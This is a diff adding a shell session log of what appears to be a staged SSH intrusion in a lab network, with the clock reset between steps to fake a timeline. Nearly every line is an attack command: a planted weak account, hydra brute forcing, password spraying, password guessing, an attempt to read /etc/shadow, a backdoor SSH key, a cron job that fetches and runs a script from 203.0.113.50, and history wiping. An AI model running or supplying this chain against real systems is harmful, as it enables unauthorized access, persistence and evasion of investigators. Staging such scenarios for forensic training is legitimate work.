@@ -1,0 +1,38 @@
+$ sudo timedatectl set-ntp false && sudo date -s '2026-11-24 22:41:00' >/dev/null && date
+Tue Nov 24 22:41:00 +07 2026
+$ sshpass -p 'An-Lab-2026!' ssh -tt -o StrictHostKeyChecking=no -b 192.168.56.20 an@192.168.56.10 "echo 'An-Lab-2026!' | sudo -S -p '' bash -c 'useradd -m -s /bin/bash -c \"tai khoan thu cho dev\" test && echo test:qwerty123 | chpasswd'; true" 2>&1 | tr -d '\r' | grep -v '^$'   # ← trên máy keodo
+Connection to 192.168.56.10 closed.
+$ sudo date -s '2026-11-24 23:05:00' >/dev/null && date
+Tue Nov 24 23:05:00 +07 2026
+$ hydra -L users.txt -P pass.txt -t 4 -I ssh://192.168.56.10 2>&1 | grep -E 'login tried|valid password|completed|ERROR' | tail -3   # ← trên máy keodo
+1 of 1 target completed, 0 valid password found
+$ sudo date -s '2026-11-25 01:20:00' >/dev/null && date
+Wed Nov 25 01:20:00 +07 2026
+$ for u in $(cat spray.txt); do sshpass -p '123456' ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -o ConnectTimeout=5 -b 192.168.56.88 $u@192.168.56.10 true 2>/dev/null; done; echo "rải xong $(wc -l < spray.txt) tên"   # ← trên máy keodo
+rải xong 25 tên
+$ sudo date -s '2026-11-25 03:41:00' >/dev/null && date
+Wed Nov 25 03:41:00 +07 2026
+$ n=0; for p in $(cat test-pass.txt); do n=$((n+1)); if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -b 192.168.56.77 test@192.168.56.10 true 2>/dev/null; then echo "trúng sau $n lần: $p"; break; fi; sleep 4; done   # ← trên máy keodo
+trúng sau 12 lần: qwerty123
+$ yes y | ssh-keygen -q -t ed25519 -N '' -C 'x@kali' -f ~/.ssh/cua_sau >/dev/null 2>&1; sshpass -p 'qwerty123' ssh -tt -o StrictHostKeyChecking=no -b 192.168.56.77 test@192.168.56.10 "id; uname -a; grep -c bash /etc/passwd; ls /home; cat /etc/shadow; echo qwerty123 | sudo -S -p '' -l; mkdir -p ~/.ssh; echo '$(cat ~/.ssh/cua_sau.pub)' | tee -a ~/.ssh/authorized_keys >/dev/null; chmod 600 ~/.ssh/authorized_keys; true" 2>&1 | tr -d '\r' | grep -v '^$'   # ← trên máy keodo
+uid=1004(test) gid=1004(test) groups=1004(test)
+Linux lab7 6.8.0-149-generic #149-Ubuntu SMP PREEMPT_DYNAMIC Fri Oct 23 13:21:10 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
+6
+an  backup2  dev  hv  test
+cat: /etc/shadow: Permission denied
+Sorry, user test may not run sudo on lab7.
+Connection to 192.168.56.10 closed.
+$ sudo date -s '2026-11-25 03:52:00' >/dev/null && date
+Wed Nov 25 03:52:00 +07 2026
+$ ssh -tt -i ~/.ssh/cua_sau -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -b 192.168.56.77 test@192.168.56.10 "w -h | head -3; crontab -l 2>&1 | head -1; (crontab -l 2>/dev/null; echo '*/10 * * * * curl -s http://203.0.113.50/x.sh | sh') | crontab -; history -c; true" 2>&1 | tr -d '\r' | grep -v '^$'   # ← trên máy keodo
+test              192.168.56.77    03:52   22:24m  0.00s   ?    sshd: test [priv]
+bash: line 1: crontab: command not found
+bash: line 1: crontab: command not found
+Connection to 192.168.56.10 closed.
+$ sudo date -s '2026-11-25 07:58:00' >/dev/null && date
+Wed Nov 25 07:58:00 +07 2026
+$ ssh -b 192.168.56.20 hv@192.168.56.10 'echo "hv vào ca sáng: $(date +%H:%M)"'   # ← trên máy keodo
+hv vào ca sáng: 07:58
+$ sudo timedatectl set-ntp true; sleep 8; timedatectl | grep -E 'synchronized|NTP service'
+System clock synchronized: yes
+              NTP service: active
